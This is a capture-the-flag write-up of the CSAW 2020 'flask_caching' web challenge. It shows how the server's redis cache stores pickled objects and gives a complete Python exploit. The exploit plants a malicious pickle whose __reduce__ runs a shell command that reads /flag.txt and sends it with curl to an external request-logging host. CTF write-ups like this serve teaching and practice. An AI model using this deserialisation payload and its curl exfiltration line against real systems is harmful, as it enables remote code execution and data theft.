---
layout: post
author: Veryyes
title: "CSAW 2020 CTF: Flask Caching"
date: 2020-09-12 12:35:32 -0500
categories: CTF-writeup
ctf-category: Web
---

# flask_caching

## Overview
I'm usually terrible at web challenges, but this one was pretty fun. So the challenge is a flask webserver with flask_caching (wow didn't see that one) with a redis server backing the caching system
Here's the [source code](/assets/csaw-2020/flask_caching/clean_app.py)

Essentially you can give that website a string as the key and a file as its corresponding value, and it will cache the values. The same goes for the cached functions. 

## Investigating the Behavior
After setting up the dependencies and the redis server I started wiresharking and watching the traffic going on

![POST Request](/assets/csaw-2020/flask_caching/regular_request.png)

Heres a normal request to the webserver with the title "dongs" and a file named "test.txt" with it's contents being "test things"

After recieving the last request, the webserver tells the redis server to cache the values it received.

![Webserver to Redis](/assets/csaw-2020/flask_caching/regular_cache.png)

Interesting. Lets see what it looks like when the webserver caches a function.

![Function Cache](/assets/csaw-2020/flask_caching/func_cache.png)

I asked the webserver for `localhost:5000/test5`; packets to redis looks pretty similar. That `$-1` response means that value doesnt exist in the cache, so the webserver responds with a `SETEX` command to `flask_cache_view//test5`. In fact that last section of the respond is just the data that tells redis to cache some data. but the data its caching in this response is binary data and looks kinda like a pickled python object

## Very research, much good
So, the `flask_caching` module is serializing either the function or the function's results some how, so lets just read the code and find out what it's doing.

### flask_caching/backends/rediscache.py
```
    def load_object(self, value):
        """The reversal of :meth:`dump_object`.  This might be called with
        None.
        """
        if value is None:
            return None
        if value.startswith(b"!"):
            try:
                return pickle.loads(value[1:])
            except pickle.PickleError:
                return None
        try:
            return int(value)
        except ValueError:
            # before 0.8 we did not have serialization.  Still support that.
            return value
```

So looks like it just pickles the data and appends a '!' character at the beginning. This matches the data we saw in wireshark. If we drop the '!' and unpickle the binary data from the previous packet capture, we just get the string "test" which is the return value of the handler function.

Cool, so the webserver is unpickling data we send it. Thats definitely a thing thats vulnerable, so after a quick google search and some testing around on the CTF server I came up with a solution:

```
#!/usr/bin/env python3
import time
import requests
import pickle
import os

payload="test_file"

class jinja2:
    def __reduce__(self):
        return (os.system,('cat /flag.txt > /tmp/out; curl https://penis.free.beeceptor.com/ --data @/tmp/out',))

with open(payload, 'wb') as f:
    f.write(b'!')
    f.write(pickle.dumps(jinja2()))


# host = 'localhost'
host='web.chal.csaw.io'

url = "http://{}:5000/".format(host)

# Send a malicious payload to cache a object that will run a command to exfil the flag to a chosen endpoint
r = requests.post(url, 
    files={'content': (payload, open(payload,'rb'), 'application/octet-stream')}, 
    data={"title": "flask_cache_view//test5"}, 
)

print(r.text)


url += 'test5'

# Send a webrequest to the endpoint to call the unpickling code executing the payload
r = requests.get(url)
print(r.text)
```

So the way this works is that when you run pickle.load() on pickled data it runs the `__reduce__` function of that object by default. In this case I overrode `__reduce__` to run bash commands.


The class is named `jinja2` because the object being unpickled must existing in the namespace of the programming unpickling it

`https://penis.free.beeceptor.com` is a free service that lets you send web requests too and displays them for easy display. This is what I used to exfiltrate the flag

The request body will have the flag:

```
flag{f1@sK_10rD}
```